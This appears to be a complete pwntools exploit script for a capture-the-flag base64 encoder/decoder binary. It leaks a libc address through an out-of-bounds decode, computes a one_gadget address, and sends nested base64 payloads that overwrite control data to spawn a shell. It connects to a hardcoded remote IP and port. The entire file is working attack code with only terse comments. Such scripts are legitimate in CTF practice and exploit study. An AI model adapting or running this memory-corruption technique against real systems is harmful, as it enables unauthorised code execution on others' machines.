#!/usr/bin/env python3

from pwn import *
from base64 import b64encode, b64decode

elf = ELF("./chall")
libc = ELF("./libc.so.6")
#p = process(["./ld-2.27.so", "--library-path", "./", "./chall"])
p = remote("185.14.184.242", 9990)

def encode(data):
    p.sendlineafter("> ", "1")
    p.sendafter(": ", data)

def decode(data):
    p.sendlineafter("> ", "2")
    p.sendafter(": ", data)

# Leak libc (rbtree is a god btw).
# Libc address is at &b64_reverse_table - 0x68.
# No need to leak LSB or the 6th byte, since those are constant.
decode(b"888\x99888\x9a888\x9b888\x9c")

# Parse leak
p.recvuntil("Output: ")

leak = p.recvline().strip()
leak = 0x20 + (leak[2] << 8) + (leak[5] << 16) + (leak[8] << 24) + (leak[11] << 32) + (0x7f << 40)
libc.address = leak - 0x43520
one_gadget = libc.address + 0x4f322

log.info("Libc base: " + hex(libc.address))

# sice time, first we clear the output buffer
encode(b"\x00")

# now lets go
decode(b64encode(b64encode(b64encode(b"BBB"*9))))
decode(b64encode(b64encode(b64encode(b"BBB"*9))))
decode(b64encode(b64encode(b64encode(b"BBB"*6 + b"BB" + p64(one_gadget)[:6]))))

# exit to trigger the ropchain
p.sendlineafter("> ", "x")

p.interactive()
